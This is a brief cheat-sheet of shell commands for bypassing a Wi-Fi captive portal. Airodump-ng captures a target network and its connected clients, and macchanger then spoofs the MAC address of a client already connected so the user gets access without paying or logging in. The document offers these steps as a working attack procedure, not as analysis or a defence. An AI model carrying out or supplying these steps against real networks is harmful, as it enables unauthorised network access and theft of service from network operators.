# Collect info:
airodump-ng [interface] --essid [ESSID] --output-form netxml -w "Network Name"

# Get connected clients parsing this dump.
# Stop monitoring networks.
# Connect to the network with captive portal.
# Change your MAC to a connected MAC:
ifconfig [interface] down
macchanger -m [NEW MAC] [interface]
ifconfig [interface] up
